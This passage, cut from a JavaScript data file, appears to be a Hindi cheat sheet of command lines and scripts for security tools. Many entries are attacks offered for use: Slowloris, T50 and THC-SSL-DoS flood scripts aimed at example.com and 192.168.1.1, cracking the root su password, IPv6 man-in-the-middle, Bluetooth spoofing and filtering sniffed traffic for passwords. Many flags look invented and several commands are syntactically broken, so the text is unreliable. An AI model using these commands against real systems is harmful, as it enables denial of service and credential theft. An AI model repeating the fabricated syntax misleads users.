      { cmd: "mmls disk.dd && fls -o $(mmls disk.dd | grep 'Linux' | awk '{print $3}') disk.dd", desc: "पार्टीशन ढूँढें और फ़ाइल सूची" },
      { cmd: "fls -r -o 2048 disk.dd 2>&1 | tee fls.log", desc: "रीकर्सिव फ़ाइल सूची लॉग" },
      { cmd: "icat disk.dd $(fls -r disk.dd | grep 'secret' | awk '{print $2}') > secret.txt", desc: "सीक्रेट फ़ाइल निकालें" },
      { cmd: "tsk_recover -o 2048 disk.dd /output", desc: "फ़ाइलें रिकवर करें" },
      { cmd: "fls -d -r disk.dd | awk '{print $2}' | xargs -I{} icat disk.dd {} > recovered_deleted.txt", desc: "डिलीट फ़ाइलें रिकवर" }
    ],
    script: "echo 'SleuthKit फ़ॉरेंसिक विश्लेषण...'\nmmls evidence.dd > /tmp/partitions.txt\nfls -r -o 2048 evidence.dd > /tmp/all_files.txt 2>/dev/null\nfls -d -r -o 2048 evidence.dd > /tmp/deleted_files.txt 2>/dev/null\necho 'डेटा /tmp/ में सेव'"
  },
  Slowloris: {
    install: { pkg: "slowloris" },
    options: [
      ["-p <port>", "पोर्ट"],
      ["-s <sockets>", "सॉकेट काउंट"],
      ["-t <sec>", "टाइमआउट"],
      ["-r <rate>", "रेट"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-u <url>", "URL"],
      ["-d <host>", "होस्ट"],
      ["-c <conn>", "कनेक्शन मोड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "slowloris -d example.com -p 80 -s 500", desc: "Slowloris DoS अटैक" },
      { cmd: "slowloris -d example.com -s 1000", desc: "1000 सॉकेट DoS" },
      { cmd: "slowloris -d example.com -p 443 -s 200", desc: "HTTPS Slowloris" },
      { cmd: "slowloris -d example.com -s 500 -t 30", desc: "30 सेकंड टाइमआउट" },
      { cmd: "slowloris -u http://example.com -s 100", desc: "URL मोड Slowloris" },
      { cmd: "slowloris -d example.com -s 300 -v", desc: "वर्बोज़ Slowloris" },
      { cmd: "slowloris -d example.com -s 800 -q", desc: "शांत Slowloris" },
      { cmd: "slowloris -d example.com -p 8080 -s 200", desc: "पोर्ट 8080 DoS" },
      { cmd: "slowloris -d example.com -s 500 -r 10", desc: "रेट 10 Slowloris" },
      { cmd: "slowloris -d example.com -s 1500", desc: "1500 सॉकेट DoS" }
    ],
    advanced: [
      { cmd: "slowloris -d example.com -s 1000 -v -t 60 2>&1 | tee slowloris.log", desc: "हाई-सॉकेट Slowloris लॉग" },
      { cmd: "slowloris -d example.com -s 500 & && sleep 60 && pkill slowloris", desc: "60 सेकंड Slowloris" },
      { cmd: "for i in 1 2 3; do slowloris -d example.com -s 200 &; done", desc: "एकाधिक Slowloris इंस्टेंस" },
      { cmd: "slowloris -d example.com -s 500 -v 2>&1 | grep -i 'send\\;connect'", desc: "सॉकेट स्थिति मॉनिटर" },
      { cmd: "slowloris -d example.com -s 300 -p 443 -t 120 2>&1", desc: "2 मिनट HTTPS Slowloris" }
    ],
    script: "echo 'Slowloris DoS अटैक...'\nslowloris -d example.com -p 80 -s 1000 -v -t 30 2>&1 | tee /tmp/slowloris.log &\nATTACK_PID=$!\nsleep 60\nkill $ATTACK_PID\necho 'अटैक पूर्ण'"
  },
  SmaliBaksmali: {
    install: { pkg: "smali-baksmali" },
    options: [
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-a <api>", "API लेवल"],
      ["-f", "फ़ोर्स"],
      ["-v", "वर्बोज़"],
      ["-j <threads>", "थ्रेड्स"],
      ["-s", "साइलेंट"],
      ["-r", "रीसोर्स"],
      ["-x <file>", "पीसीपी फ़ाइल"],
      ["-p <dir>", "फ़्रेमवर्क डायर"],
      ["--help", "सहायता"]
    ],
    basic: [
      { cmd: "baksmali d classes.dex -o smali_out", desc: "Dex से Smali डिसअसेंबल" },
      { cmd: "smali a smali_out -o classes.dex", desc: "Smali से Dex असेंबल" },
      { cmd: "baksmali d app.apk -o smali_src", desc: "APK डिसअसेंबल करें" },
      { cmd: "smali a smali -a 29 -o classes.dex", desc: "API 29 असेंबल" },
      { cmd: "baksmali d classes.dex -v", desc: "वर्बोज़ डिसअसेंबल" },
      { cmd: "baksmali d classes.dex -f -o out", desc: "फ़ोर्स ओवरराइट" },
      { cmd: "smali a smali -j 4 -o classes.dex", desc: "4 थ्रेड असेंबल" },
      { cmd: "baksmali d app.apk -r -o dex_src", desc: "रीसोर्स के साथ" },
      { cmd: "baksmali d classes.dex -o smali -a 28", desc: "API 28 लक्ष्य" },
      { cmd: "smali a /tmp/smali -o new_classes.dex", desc: "Smali से नया Dex" }
    ],
    advanced: [
      { cmd: "baksmali d app.apk -o /tmp/smali -v 2>&1 | tee baksmali.log", desc: "APK डिसअसेंबल लॉग" },
      { cmd: "baksmali d classes.dex -o /tmp/smali && grep -r 'const-string' /tmp/smali/", desc: "स्ट्रिंग खोज" },
      { cmd: "baksmali d classes.dex && sed -i 's|const/4 v0, 0x0|const/4 v0, 0x1|' smali_out/*.smali && smali a smali_out -o mod.dex", desc: "मॉडिफ़ाई और रीअसेंबल" },
      { cmd: "for f in *.dex classes*.dex; do baksmali d $f -o $(basename $f .dex)_smali; done", desc: "एकाधिक DEX डिसअसेंबल" },
      { cmd: "baksmali d app.apk -o /tmp/smali 2>&1 | grep -i 'error\\;warning'", desc: "त्रुटि फ़िल्टर" }
    ],
    script: "echo 'Smali/Baksmali...'\nbaksmali d $1 -o /tmp/decompiled 2>/dev/null\necho 'डिसअसेंबल हुआ:' /tmp/decompiled\ngrep -rn 'const-string' /tmp/decompiled/ | head -10"
  },
  SniffJoke: {
    install: { pkg: "sniff-joke" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-d", "डीबग"],
      ["-p <port>", "पोर्ट"],
      ["-r <file>", "पीसीएपी रीड"],
      ["-o <file>", "आउटपुट"],
      ["-c <conf>", "कॉन्फ़िग फ़ाइल"],
      ["-t <type>", "जोक प्रकार"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "sniffjoke -i eth0", desc: "SniffJoke शुरू करें" },
      { cmd: "sniffjoke -i eth0 -v", desc: "वर्बोज़ मोड" },
      { cmd: "sniffjoke -i eth0 -c /etc/sniffjoke.conf", desc: "कॉन्फ़िग फ़ाइल से" },
      { cmd: "sniffjoke -i eth0 -d", desc: "डीबग मोड" },
      { cmd: "sniffjoke -i eth0 -s", desc: "साइलेंट मोड" },
      { cmd: "sniffjoke -i wlan0", desc: "वायरलेस इंटरफ़ेस" },
      { cmd: "sniffjoke -i eth0 -t injection", desc: "इंजेक्शन मोड" },
      { cmd: "sniffjoke -i eth0 -o log.txt", desc: "लॉग फ़ाइल" },
      { cmd: "sniffjoke -i eth0 -p 80", desc: "पोर्ट 80 पर" },
      { cmd: "sniffjoke -r capture.pcap", desc: "PCAP फ़ाइल से" }
    ],
    advanced: [
      { cmd: "sniffjoke -i eth0 -v -c /etc/sniffjoke.conf -d 2>&1 | tee sniffjoke.log", desc: "पूर्ण SniffJoke लॉग" },
      { cmd: "sniffjoke -i eth0 -v 2>&1 | grep -i 'packet\\;inject\\;error'", desc: "पैकेट इंजेक्शन मॉनिटर" },
      { cmd: "tcpdump -i eth0 -w original.pcap & sniffjoke -i eth0 -v", desc: "SniffJoke के साथ कैप्चर" },
      { cmd: "sniffjoke -i eth0 -t injection -v 2>&1 | awk '/injected/{print $2}'", desc: "इंजेक्टेड पैकेट गिनती" },
      { cmd: "for iface in eth0 wlan0; do sniffjoke -i $iface -s &; done", desc: "एकाधिक इंटरफ़ेस" }
    ],
    script: "echo 'SniffJoke शुरू...'\nsniffjoke -i eth0 -v -c /etc/sniffjoke.conf 2>&1 | tee /tmp/sniffjoke.log &\necho 'SniffJoke चल रहा है...'"
  },
  Sparta: {
    install: { pkg: "sparta" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-t <file>", "लक्ष्य फ़ाइल"],
      ["-m", "मैसेज मोड"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-s <file>", "सेव फ़ाइल"],
      ["-l <file>", "लॉग फ़ाइल"],
      ["-p <port>", "पोर्ट"],
      ["-b", "बैकग्राउंड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "sparta -i eth0", desc: "Sparta GUI शुरू" },
      { cmd: "sparta -t targets.txt", desc: "लक्ष्य फ़ाइल लोड" },
      { cmd: "sparta -t targets.txt -s session.xml", desc: "सेशन सेव करें" },
      { cmd: "sparta -t targets.txt -l sparta.log", desc: "लॉग फ़ाइल" },
      { cmd: "sparta -t targets.txt -m", desc: "मैसेज मोड" },
      { cmd: "sparta -t targets.txt -v", desc: "वर्बोज़ मोड" },
      { cmd: "sparta -t targets.txt -q", desc: "शांत मोड" },
      { cmd: "sparta -i eth0 -t targets.txt", desc: "इंटरफ़ेस और लक्ष्य" },
      { cmd: "sparta -t targets.txt -b", desc: "बैकग्राउंड मोड" },
      { cmd: "sparta -t targets.txt -p 80,443,22", desc: "पोर्ट फ़िल्टर" }
    ],
    advanced: [
      { cmd: "sparta -t targets.txt -v -l /tmp/sparta.log 2>&1 | tee sparta.log", desc: "Sparta स्कैन लॉग" },
      { cmd: "sparta -t targets.txt -m -v 2>&1 | grep -i 'open\\;found\\;vuln'", desc: "खुले पोर्ट फ़िल्टर" },
      { cmd: "nmap -sS -oG - 192.168.1.0/24 | grep 'open' > targets.txt && sparta -t targets.txt", desc: "nmap से लक्ष्य और Sparta" },
      { cmd: "sparta -t targets.txt -p 22,80,443,445,3389 -v", desc: "सामान्य पोर्ट स्कैन" },
      { cmd: "sparta -t targets.txt -s session.xml -v && xsltproc /usr/share/sparta/report.xsl session.xml", desc: "सेशन सेव और रिपोर्ट" }
    ],
    script: "echo 'Sparta नेटवर्क स्कैन...'\nnmap -sV -p 22,80,443,445,3389 192.168.1.0/24 -oG /tmp/sparta_targets.txt 2>/dev/null\nsparta -t /tmp/sparta_targets.txt -l /tmp/sparta.log -v 2>&1 | tee /tmp/sparta_run.log\necho 'Sparta स्कैन पूर्ण'"
  },
  Spooftooph: {
    install: { pkg: "spooftooph" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-b <addr>", "लक्ष्य Bluetooth पता"],
      ["-n <name>", "नकली नाम"],
      ["-a <addr>", "नकली MAC"],
      ["-c <class>", "डिवाइस क्लास"],
      ["-s", "स्कैन मोड"],
      ["-v", "वर्बोज़"],
      ["-r", "रैंडम मोड"],
      ["-o <file>", "आउटपुट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "spooftooph -i hci0 -s", desc: "Bluetooth डिवाइस स्कैन" },
      { cmd: "spooftooph -i hci0 -b 00:11:22:33:44:55 -n iPhone_Pro", desc: "नकली नाम सेट करें" },
      { cmd: "spooftooph -i hci0 -b 00:11:22:33:44:55 -a 00:AA:BB:CC:DD:EE", desc: "नकली MAC सेट" },
      { cmd: "spooftooph -i hci0 -b 00:11:22:33:44:55 -c 0x5a020c", desc: "डिवाइस क्लास बदलें" },
      { cmd: "spooftooph -i hci0 -b 00:11:22:33:44:55 -r", desc: "रैंडम MAC मोड" },
      { cmd: "spooftooph -i hci0 -b 00:11:22:33:44:55 -n TestDevice -v", desc: "वर्बोज़ स्पूफ़" },
      { cmd: "spooftooph -i hci0 -s -v", desc: "वर्बोज़ BT स्कैन" },
      { cmd: "spooftooph -i hci1 -b 00:11:22:33:44:55 -n FreeWiFi", desc: "दूसरे इंटरफ़ेस" },
      { cmd: "spooftooph -i hci0 -b 00:11:22:33:44:55 -n 'My BT' -a 00:11:22:33:44:FF", desc: "पूर्ण BT स्पूफ़" },
      { cmd: "spooftooph -i hci0 -o scan_output.txt", desc: "स्कैन आउटपुट फ़ाइल" }
    ],
    advanced: [
      { cmd: "spooftooph -i hci0 -b 00:11:22:33:44:55 -n FakeDevice -a 00:AA:BB:CC:DD:EE -v 2>&1 | tee spooftooph.log", desc: "पूर्ण BT स्पूफ़ लॉग" },
      { cmd: "hcitool scan && spooftooph -i hci0 -b $DEVICE -r", desc: "डिवाइस खोजें और MAC रैंडमाइज़" },
      { cmd: "spooftooph -i hci0 -s -v 2>&1 | grep -i 'found\\;device'", desc: "मिले डिवाइस फ़िल्टर" },
      { cmd: "for mac in $(cat bt_macs.txt); do spooftooph -i hci0 -b $mac -r; done", desc: "एकाधिक MAC रैंडमाइज़" },
      { cmd: "hciconfig hci0 down && spooftooph -i hci0 -b NEW_MAC -a 00:11:22:33:44:55 && hciconfig hci0 up", desc: "MAC बदलें और पुनः आरंभ" }
    ],
    script: "echo 'Bluetooth स्पूफ़िंग...'\nhciconfig hci0 down\nspooftooph -i hci0 -b 00:11:22:33:44:55 -a 00:AA:BB:CC:DD:EE -v 2>&1 | tee /tmp/spooftooph.log\nhciconfig hci0 up\necho 'MAC स्पूफ़ किया गया'"
  },
  Stunnel: {
    install: { pkg: "stunnel" },
    options: [
      ["-c <file>", "कॉन्फ़िग फ़ाइल"],
      ["-d <level>", "डीबग लेवल"],
      ["-p <pid>", "PID फ़ाइल"],
      ["-f", "फ़ोरग्राउंड"],
      ["-i <iface>", "इंटरफ़ेस"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-ssl2", "SSLv2 सक्षम"],
      ["-ssl3", "SSLv3 सक्षम"]
    ],
    basic: [
      { cmd: "stunnel /etc/stunnel/stunnel.conf", desc: "SSL टनल शुरू" },
      { cmd: "stunnel -f /etc/stunnel/stunnel.conf", desc: "फ़ोरग्राउंड SSL टनल" },
      { cmd: "stunnel -f -d 7 /etc/stunnel/stunnel.conf", desc: "डीबग लेवल 7" },
      { cmd: "stunnel -p /var/run/stunnel.pid /etc/stunnel/stunnel.conf", desc: "PID फ़ाइल के साथ" },
      { cmd: "stunnel -f -v /etc/stunnel/stunnel.conf", desc: "वर्बोज़ फ़ोरग्राउंड" },
      { cmd: "stunnel -q /etc/stunnel/stunnel.conf", desc: "शांत मोड" },
      { cmd: "stunnel -f -ssl2 /etc/stunnel/stunnel.conf", desc: "SSLv2 सक्षम" },
      { cmd: "stunnel -f -ssl3 /etc/stunnel/stunnel.conf", desc: "SSLv3 सक्षम" },
      { cmd: "stunnel -f -i 127.0.0.1 /etc/stunnel/stunnel.conf", desc: "इंटरफ़ेस बाइंड" },
      { cmd: "stunnel -f -o /var/log/stunnel.log /etc/stunnel/stunnel.conf", desc: "लॉग फ़ाइल" }
    ],
    advanced: [
      { cmd: "stunnel -f -d 7 -v /etc/stunnel/stunnel.conf 2>&1 | tee stunnel.log", desc: "पूर्ण डीबग लॉग" },
      { cmd: "stunnel -f /etc/stunnel/stunnel.conf & && curl -k https://127.0.0.1:8443", desc: "टनल और स्थानीय परीक्षण" },
      { cmd: "stunnel -f -d 7 /etc/stunnel/stunnel.conf 2>&1 | grep -i 'error\\;connect'", desc: "कनेक्शन त्रुटियाँ फ़िल्टर" },
      { cmd: "for port in 443 8443 9443; do sed -i 's/accept =.*/accept = :$port/' /etc/stunnel/stunnel.conf && stunnel -f -q; done", desc: "एकाधिक पोर्ट टनल" },
      { cmd: "stunnel -f -d 7 /etc/stunnel/stunnel.conf 2>&1 | awk '/Service|Configuration|Certificate/{print}'", desc: "सेवा और सर्टिफ़िकेट जानकारी" }
    ],
    script: "echo 'Stunnel SSL टनल शुरू...'\ncat > /tmp/stunnel.conf << EOF\n[ssl_tunnel]\naccept = 8443\nconnect = 127.0.0.1:80\ncert = /etc/stunnel/stunnel.pem\nEOF\nstunnel -f -d 5 /tmp/stunnel.conf 2>&1"
  },
  Sucrack: {
    install: { pkg: "sucrack" },
    options: [
      ["-u <user>", "यूज़रनेम"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-t <sec>", "विलंब"],
      ["-r <rate>", "रेट"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-o <file>", "आउटपुट"],
      ["-p", "प्रॉक्सी मोड"],
      ["-l", "लूप मोड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "sucrack -u root -w /usr/share/wordlists/rockyou.txt", desc: "su पासवर्ड क्रैक" },
      { cmd: "sucrack -u admin -w wordlist.txt -t 2", desc: "2 सेकंड विलंब" },
      { cmd: "sucrack -u root -w dict.txt -v", desc: "वर्बोज़ su क्रैक" },
      { cmd: "sucrack -u root -w /usr/share/wordlists/rockyou.txt -o found.txt", desc: "पासवर्ड फ़ाइल में" },
      { cmd: "sucrack -u admin -w pass.txt -s", desc: "साइलेंट क्रैक" },
      { cmd: "sucrack -u root -w words.txt -r 10", desc: "रेट 10 प्रयास" },
      { cmd: "sucrack -u root -w wordlist.txt -l", desc: "लूप मोड" },
      { cmd: "sucrack -u admin -w dict.txt -p", desc: "प्रॉक्सी मोड" },
      { cmd: "sucrack -u root -w /usr/share/wordlists/fasttrack.txt", desc: "FastTrack क्रैक" },
      { cmd: "sucrack -u test -w small.txt -v -t 1", desc: "तेज़ परीक्षण" }
    ],
    advanced: [
      { cmd: "sucrack -u root -w /usr/share/wordlists/rockyou.txt -v -o /tmp/pass.txt 2>&1 | tee sucrack.log", desc: "su क्रैक पूर्ण लॉग" },
      { cmd: "sucrack -u root -w /usr/share/wordlists/rockyou.txt -v 2>&1 | grep -i 'found\\;password'", desc: "मिला पासवर्ड फ़िल्टर" },
      { cmd: "for user in root admin test backup; do sucrack -u $user -w dict.txt -s; done", desc: "एकाधिक यूज़र क्रैक" },
      { cmd: "sucrack -u root -w /usr/share/wordlists/rockyou.txt -p 2>&1", desc: "प्रॉक्सी मोड क्रैक" },
      { cmd: "sucrack -u root -w wordlist.txt -v 2>&1 | tail -5", desc: "अंतिम 5 क्रैक लॉग" }
    ],
    script: "echo 'su पासवर्ड क्रैकिंग...'\nsucrack -u root -w /usr/share/wordlists/rockyou.txt -v -o /tmp/su_pass.txt 2>&1 | tee /tmp/sucrack.log\nif [ -s /tmp/su_pass.txt ]; then\n  echo 'पासवर्ड मिल गया!'\nfi"
  },
  T50: {
    install: { pkg: "t50" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-s <host>", "लक्ष्य होस्ट"],
      ["-p <port>", "पोर्ट"],
      ["-c <count>", "पैकेट गिनती"],
      ["-r <rate>", "पैकेट दर"],
      ["-t <type>", "पैकेट प्रकार"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-l <len>", "पैकेट लंबाई"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "t50 192.168.1.1 -p 80 -c 1000", desc: "DoS अटैक 1000 पैकेट" },
      { cmd: "t50 example.com -p 80 -c 5000 -r 1000", desc: "तेज़ DoS 5000 पैकेट" },
      { cmd: "t50 192.168.1.1 -p 80 -c 10000 -v", desc: "वर्बोज़ DoS" },
      { cmd: "t50 192.168.1.1 -p 443 -c 500 -t syn", desc: "SYN फ़्लड DoS" },
      { cmd: "t50 192.168.1.1 -p 80 -c 1000 -q", desc: "शांत DoS" },
      { cmd: "t50 example.com -p 80 -c 100000 -r 10000", desc: "हाई-रेट DoS" },
      { cmd: "t50 192.168.1.1 -p 22 -c 2000 -t ack", desc: "ACK फ़्लड DoS" },
      { cmd: "t50 192.168.1.1 -p 80 -c 5000 -l 64", desc: "64 बाइट पैकेट DoS" },
      { cmd: "t50 192.168.1.1 -p 53 -c 3000 -t udp", desc: "UDP फ़्लड DoS" },
      { cmd: "t50 192.168.1.1 -p 80 -c 500 -t icmp", desc: "ICMP फ़्लड DoS" }
    ],
    advanced: [
      { cmd: "t50 192.168.1.1 -p 80 -c 100000 -r 10000 -v 2>&1 | tee t50.log", desc: "हाई-रेट DoS लॉग" },
      { cmd: "t50 192.168.1.1 -p 80 -c 50000 -r 5000 & && sleep 30 && pkill t50", desc: "30 सेकंड DoS" },
      { cmd: "t50 192.168.1.1 -p 80 -v 2>&1 | grep -i 'sent\\;error'", desc: "भेजे गए पैकेट मॉनिटर" },
      { cmd: "for i in 1 2 3; do t50 example.com -p 80 -c 10000 -r 1000 &; done", desc: "एकाधिक T50 इंस्टेंस" },
      { cmd: "t50 192.168.1.1 -p 80,443,22 -c 5000 -t syn,ack,udp 2>&1", desc: "एकाधिक पोर्ट और प्रकार" }
    ],
    script: "echo 'T50 DoS अटैक...'\nt50 $1 -p 80 -c 100000 -r 5000 -v 2>&1 | tee /tmp/t50_attack.log &\nATTACK_PID=$!\nsleep $2\nkill $ATTACK_PID\necho 'DoS अटैक समाप्त'"
  },
  TCPFlow: {
    install: { pkg: "tcp-flow" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-r <file>", "PCAP फ़ाइल"],
      ["-c", "क्रमबद्ध आउटपुट"],
      ["-e", "एक्सट्रैक्ट फ़ाइल"],
      ["-p <port>", "पोर्ट फ़िल्टर"],
      ["-t <host>", "होस्ट फ़िल्टर"],
      ["-v", "वर्बोज़"],
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-s", "साइलेंट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "tcpflow -i eth0", desc: "TCP फ़्लो कैप्चर" },
      { cmd: "tcpflow -r capture.pcap", desc: "PCAP से फ़्लो पार्स" },
      { cmd: "tcpflow -i eth0 -o /tmp/flows", desc: "फ़्लो फ़ाइलों में सेव" },
      { cmd: "tcpflow -i eth0 -p 80", desc: "पोर्ट 80 TCP फ़्लो" },
      { cmd: "tcpflow -i eth0 -c", desc: "कंसोल TCP फ़्लो" },
      { cmd: "tcpflow -i eth0 -t 192.168.1.100", desc: "होस्ट फ़िल्टर फ़्लो" },
      { cmd: "tcpflow -r http.pcap -o extracted", desc: "PCAP HTTP फ़्लो निकालें" },
      { cmd: "tcpflow -i eth0 -v", desc: "वर्बोज़ TCP फ़्लो" },
      { cmd: "tcpflow -i eth0 -s", desc: "साइलेंट TCP फ़्लो" },
      { cmd: "tcpflow -i eth0 -p 22", desc: "SSH फ़्लो कैप्चर" }
    ],
    advanced: [
      { cmd: "tcpflow -i eth0 -o /tmp/flows -v -p 80 2>&1 | tee tcpflow.log", desc: "HTTP फ़्लो लॉग" },
      { cmd: "tcpflow -r capture.pcap -o /tmp/flow_data 2>&1 | grep -i 'file\\;saved'", desc: "PCAP फ़्लो निष्कर्षण" },
      { cmd: "tcpflow -i eth0 -c 2>&1 | grep -i 'password\\;user\\;login'", desc: "क्रेडेंशियल फ़िल्टर" },
      { cmd: "tcpdump -i eth0 -w capture.pcap && tcpflow -r capture.pcap -o /tmp/flows", desc: "tcpdump और tcpflow संयोजन" },
      { cmd: "tcpflow -i eth0 -p 80,443 -o /tmp/http_flows 2>&1", desc: "HTTP और HTTPS फ़्लो दोनों" }
    ],
    script: "echo 'TCP फ़्लो कैप्चर...'\nmkdir -p /tmp/tcpflow_$(date +%Y%m%d)\ntcpflow -i eth0 -o /tmp/tcpflow_$(date +%Y%m%d) -p 80,443 -v 2>&1 | tee /tmp/tcpflow.log &\necho 'कैप्चर चल रहा है...'"
  },
  THCIPv6: {
    install: { pkg: "thc-ipv6" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-t <target>", "लक्ष्य"],
      ["-p <port>", "पोर्ट"],
      ["-c <cmd>", "कमांड"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-d", "डीबग"],
      ["-o <file>", "आउटपुट"],
      ["-r <rate>", "रेट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "alive6 eth0", desc: "IPv6 होस्ट खोजें" },
      { cmd: "fake_router6 eth0 fe80::1/64", desc: "फ़ेक IPv6 राउटर" },
      { cmd: "dos-new-ip6 eth0", desc: "IPv6 DoS अटैक" },
      { cmd: "parasite6 eth0", desc: "IPv6 MITM अटैक" },
      { cmd: "flood_router6 eth0 fe80::1", desc: "IPv6 राउटर फ़्लड" },
      { cmd: "redir6 eth0 fe80::1 2001::1", desc: "IPv6 ट्रैफ़िक रीडायरेक्ट" },
      { cmd: "to6 2001:db8::1", desc: "IPv6 कनेक्टिविटी जाँच" },
      { cmd: "ndpexhaust6 eth0", desc: "IPv6 NDP एग्ज़ॉस्ट" },
      { cmd: "fake_advertise6 eth0 fe80::1 00:11:22:33:44:55", desc: "फ़ेक IPv6 एडवरटाइज़" },
      { cmd: "smurf6 eth0 fe80::1", desc: "IPv6 स्मर्फ अटैक" }
    ],
    advanced: [
      { cmd: "alive6 eth0 2>&1 | tee alive6.log", desc: "IPv6 होस्ट खोज लॉग" },
      { cmd: "parasite6 eth0 -v 2>&1 | grep -i 'request\\;reply'", desc: "IPv6 MITM मॉनिटर" },
      { cmd: "for cmd in alive6 parasite6 fake_router6; do $cmd eth0; done", desc: "एकाधिक THC-IPv6 टूल" },
      { cmd: "flood_router6 eth0 fe80::1 -v 2>&1 | awk '{print $1}'", desc: "राउटर फ़्लड पैकेट काउंट" },
      { cmd: "tcpdump -i eth0 'icmp6' -w ipv6.pcap & parasite6 eth0", desc: "IPv6 कैप्चर और अटैक" }
    ],
    script: "echo 'IPv6 पेनिट्रेशन टेस्ट...'\nalive6 eth0 > /tmp/ipv6_hosts.txt 2>/dev/null\ncat /tmp/ipv6_hosts.txt | while read host; do\n  echo 'होस्ट:' $host >> /tmp/ipv6_scan.txt\ndone\necho 'IPv6 होस्ट /tmp/ipv6_hosts.txt में'"
  },
  THCSSLDoS: {
    install: { pkg: "thc-ssl-dos" },
    options: [
      ["-p <port>", "पोर्ट"],
      ["-c <count>", "कनेक्शन काउंट"],
      ["-r <rate>", "कनेक्शन दर"],
      ["-v", "वर्बोज़"],
      ["-d <host>", "लक्ष्य होस्ट"],
      ["-s <size>", "पैकेट साइज़"],
      ["-t <sec>", "टाइमआउट"],
      ["-q", "शांत"],
      ["-o <file>", "आउटपुट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 1000", desc: "SSL DoS अटैक" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 5000 -r 100", desc: "तेज़ SSL DoS" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 10000 -v", desc: "वर्बोज़ SSL DoS" },
      { cmd: "thc-ssl-dos -d 192.168.1.1 -p 443 -c 2000", desc: "IP SSL DoS" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 500 -s 1024", desc: "बड़े पैकेट DoS" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 3000 -q", desc: "शांत SSL DoS" },
      { cmd: "thc-ssl-dos -d example.com -p 8443 -c 1000", desc: "पोर्ट 8443 DoS" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 1000 -t 30", desc: "30 सेकंड टाइमआउट" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 50000 -r 500", desc: "50000 कनेक्शन DoS" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 1000 -o output.txt", desc: "आउटपुट फ़ाइल" }
    ],
    advanced: [
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 50000 -r 500 -v 2>&1 | tee ssl_dos.log", desc: "हाई-रेट SSL DoS लॉग" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 10000 -v 2>&1 | grep -i 'connect\\;send'", desc: "कनेक्शन स्थिति मॉनिटर" },
      { cmd: "thc-ssl-dos -d example.com -p 443 -c 100000 & && sleep 60 && pkill thc-ssl-dos", desc: "60 सेकंड 100k DoS" },
      { cmd: "for i in 1 2 3; do thc-ssl-dos -d example.com -p 443 -c 10000 &; done", desc: "एकाधिक SSL DoS इंस्टेंस" },
      { cmd: "thc-ssl-dos -d example.com -s 65535 -c 5000 -v 2>&1", desc: "मैक्स पैकेट साइज़ DoS" }
    ],
    script: "echo 'SSL DoS अटैक शुरू...'\nthc-ssl-dos -d example.com -p 443 -c 50000 -r 1000 -v 2>&1 | tee /tmp/ssl_dos.log &\nATTACK_PID=$!\nsleep 30\nkill $ATTACK_PID\necho 'SSL DoS समाप्त'"
  },
  TestDisk: {
    install: { pkg: "test-disk" },
    options: [
      ["-c <file>", "कॉन्फ़िग फ़ाइल"],
      ["-l <file>", "लॉग फ़ाइल"],
      ["-d <dir>", "आउटपुट डायरेक्टरी"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-r", "रिकवरी मोड"],
      ["-s", "स्कैन मोड"],
      ["-f <type>", "फ़ाइल सिस्टम"],
      ["--create", "लॉग क्रिएट"],
      ["--help", "सहायता"]
    ],
    basic: [
      { cmd: "testdisk /dev/sdb", desc: "डिस्क रिकवरी शुरू" },
      { cmd: "testdisk image.dd", desc: "इमेज फ़ाइल रिकवरी" },
      { cmd: "testdisk -l testdisk.log /dev/sdb", desc: "लॉग के साथ रिकवरी" },
      { cmd: "testdisk -c /etc/testdisk.conf /dev/sdb", desc: "कॉन्फ़िग से रिकवरी" },
      { cmd: "testdisk -d /recovered /dev/sdb1", desc: "पार्टीशन रिकवरी" },
      { cmd: "testdisk /dev/sdc -v", desc: "वर्बोज़ रिकवरी" },
      { cmd: "testdisk -q /dev/sdb", desc: "शांत मोड" },
      { cmd: "testdisk /dev/sdb -f NTFS", desc: "NTFS रिकवरी" },
      { cmd: "testdisk -s /dev/sdb", desc: "स्कैन मोड" },
      { cmd: "testdisk -r /dev/sdb", desc: "रिकवरी मोड" }
    ],
    advanced: [
      { cmd: "testdisk -l /tmp/testdisk.log -v /dev/sdb 2>&1 | tee testdisk.log", desc: "पूर्ण रिकवरी लॉग" },
      { cmd: "testdisk /dev/sdb && photorec -d /rec /dev/sdb", desc: "TestDisk फिर PhotoRec" },
      { cmd: "testdisk /dev/sdb -v 2>&1 | grep -i 'partition\\;found\\;recover'", desc: "पार्टीशन खोज फ़िल्टर" },
